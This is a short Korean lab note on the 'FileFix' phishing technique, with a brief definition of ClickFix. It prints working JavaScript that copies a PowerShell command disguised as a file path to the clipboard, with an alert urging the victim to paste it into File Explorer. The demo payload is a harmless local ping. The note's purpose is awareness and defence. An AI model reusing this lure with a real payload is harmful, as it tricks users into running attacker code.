
# FileFix 공격

## 정의

피싱 페이지에서 ‘파일 공유 알림’ 등으로 위장해 사용자가 특정 경로를 파일 탐색기 주소창에 붙여 넣도록 유도

## 실습

![image](https://github.com/user-attachments/assets/dceadcf7-0b4c-495f-98b1-25b4d6840ff8)

클립보드 복사를 하도록 유도하는 웹페이지

![image](https://github.com/user-attachments/assets/f95747a7-0e00-48f4-9926-f3f48a4e1766)

버튼 클릭 시 알림이 나타나면서 파일 탐색기에 복사한 내용을 붙여넣도록 다음 행동 유도

<img src=https://github.com/user-attachments/assets/179c6aef-aa4d-4412-ad7d-21b57eddc12b width=600>

파일 탐색기에 붙여넣으면 powershell에서 ping 명령어를 실행하는 명령어도 함께 복사된 것을 확인할 수 있음

<img src=https://github.com/user-attachments/assets/bb74d151-7ed1-437d-b406-f56964052e67 width=600>

powershell에서 ping 명령어가 실행됨

※ 웹사이트 주요 코드

```
<div class="box" onclick="copyPayload()">
  📁 C:\CompanyPolicy\HRGuide.docx
</div>
```

겉으로는 파일 경로를 복사하는 것처럼 보임

```
<script>
function copyPayload() {
  const payload = `powershell.exe -c "ping 127.0.0.1" # C:\\CompanyPolicy\\HRGuide.docx`;
  const textarea = document.createElement("textarea");
  textarea.value = payload;
  document.body.appendChild(textarea);
  textarea.select();
  document.execCommand("copy");
  document.body.removeChild(textarea);
  alert("Path copied to clipboard! Try pasting it into File Explorer’s address bar.");
}
</script>
```

클립보드에 복사한 값이 powershell.exe -c "ping 127.0.0.1" # C:\\CompanyPolicy\\HRGuide.docx 이 됨

## 클릭픽스

- 정의 : 웹사이트에서 버튼을 클릭하면 악성 파워셸 명령이 클립보드에 복사되고, 사용자가 이를 실행 대화창(Win+R)이나 명령 프롬프트에 붙여 넣도록 유도

## 시사점

출처가 불분명한 파일이나 명령어 복사 붙여넣기에 대한 경각심 필요

출처 : https://www.boannews.com/media/view.asp?idx=137854&page=1&kind=1
